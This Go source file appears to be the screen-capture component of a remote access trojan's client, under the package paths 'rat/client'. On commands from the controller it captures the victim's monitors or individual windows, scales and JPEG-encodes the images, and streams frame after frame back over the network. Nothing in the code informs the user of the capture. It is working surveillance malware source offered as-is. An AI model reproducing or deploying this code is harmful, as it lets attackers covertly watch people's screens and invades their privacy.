package main

import (
	"bytes"
	"image"
	"image/jpeg"
	"rat/client/network/header"
	"rat/client/screen"

	"gopkg.in/mgo.v2/bson"

	"github.com/disintegration/imaging"
)

var screenStream bool
var monitor bool
var handle int
var scale float32

type RecvScreenPacket struct {
	Run     bool    "active"
	Scale   float32 "scale"
	Monitor bool    "monitor"
	Handle  int     "handle"
}

func (packet RecvScreenPacket) Header() header.PacketHeader {
	return header.ScreenHeader
}

type SendScreenPacket struct {
	Buffer []byte "buffer"
}

func (packet SendScreenPacket) Header() header.PacketHeader {
	return header.ScreenHeader
}

func (packet RecvScreenPacket) OnReceive() error {
	if packet.Run {
		// Dispatch one screen packet
		screenStream = false
		Queue <- &SendScreenPacket{}
	}

	screenStream = packet.Run
	monitor = packet.Monitor
	handle = packet.Handle
	scale = packet.Scale

	return nil
}

func (packet *SendScreenPacket) Init() {
	screen.QueryMonitors()

	var w bytes.Buffer

	var img image.Image

	if monitor {
		if handle >= len(screen.Monitors) {
			handle = 0
		}

		img = screen.Capture(screen.Monitors[handle])
	} else {
		img = screen.CaptureWindow(handle)
	}

	if img == nil {
		return
	}

	if scale > 0 && scale < 1.0 {
		width := float32(img.Bounds().Max.X) * scale
		height := float32(img.Bounds().Max.Y) * scale

		img = imaging.Resize(img, int(width), int(height), imaging.NearestNeighbor)
	}

	jpeg.Encode(&w, img, &jpeg.Options{
		Quality: 75,
	})

	packet.Buffer = w.Bytes()

	// Send another screen packet if we're still streaming
	if screenStream {
		go func() {
			Queue <- packet
		}()
	}
}

func (packet RecvScreenPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
